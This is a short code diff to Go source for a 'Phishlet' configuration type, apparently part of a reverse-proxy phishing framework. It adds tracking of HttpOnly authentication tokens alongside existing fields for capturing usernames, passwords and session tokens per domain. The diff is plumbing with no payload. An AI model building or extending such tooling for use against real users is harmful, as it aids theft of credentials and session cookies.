@@ -34,6 +34,7 @@ type Phishlet struct {
 	domains      []string
 	subfilters   map[string][]SubFilter
 	authTokens   map[string][]string
+	httpTokens   map[string][]string
 	k_username   string
 	re_username  string
 	k_password   string
@@ -61,8 +62,9 @@ type ConfigSubFilter struct {
 }
 
 type ConfigAuthToken struct {
-	Domain string   `mapstructure:"domain"`
-	Keys   []string `mapstructure:"keys"`
+	Domain   string   `mapstructure:"domain"`
+	Keys     []string `mapstructure:"keys"`
+	HttpOnly []string `mapstructure:"http_only"`
 }
 
 type ConfigUserRegex struct {
@@ -106,6 +108,7 @@ func (p *Phishlet) Clear() {
 	p.domains = []string{}
 	p.subfilters = make(map[string][]SubFilter)
 	p.authTokens = make(map[string][]string)
+	p.httpTokens = make(map[string][]string)
 	p.k_username = ""
 	p.re_username = ""
 	p.k_password = ""
@@ -143,7 +146,7 @@ func (p *Phishlet) LoadFromFile(path string) error {
 		p.addSubFilter(sf.Hostname, sf.Sub, sf.Domain, sf.Mimes, sf.Search, sf.Replace, sf.RedirectOnly)
 	}
 	for _, at := range fp.AuthTokens {
-		p.addAuthTokens(at.Domain, at.Keys)
+		p.addAuthTokens(at.Domain, at.Keys, at.HttpOnly)
 	}
 	p.re_username = fp.UserRegex.Re
 	p.k_username = fp.UserRegex.Key
@@ -235,8 +238,9 @@ func (p *Phishlet) addSubFilter(hostname string, subdomain string, domain string
 	p.subfilters[hostname] = append(p.subfilters[hostname], SubFilter{subdomain: subdomain, domain: domain, mime: mime, regexp: regexp, replace: replace, redirect_only: redirect_only})
 }
 
-func (p *Phishlet) addAuthTokens(hostname string, tokens []string) {
+func (p *Phishlet) addAuthTokens(hostname string, tokens []string, http_tokens []string) {
 	p.authTokens[hostname] = tokens
+	p.httpTokens[hostname] = http_tokens
 }
 
 func (p *Phishlet) getAuthTokens() []string {
@@ -269,6 +273,19 @@ func (p *Phishlet) domainExists(domain string) bool {
 	for _, d := range p.domains {
 		if domain == d {
 			return true
+		}
+	}
+	return false
+}
+
+func (p *Phishlet) isTokenHttpOnly(domain string, token string) bool {
+	for d, tokens := range p.httpTokens {
+		if domain == d {
+			for _, tk := range tokens {
+				if tk == token {
+					return true
+				}
+			}
 		}
 	}
 	return false
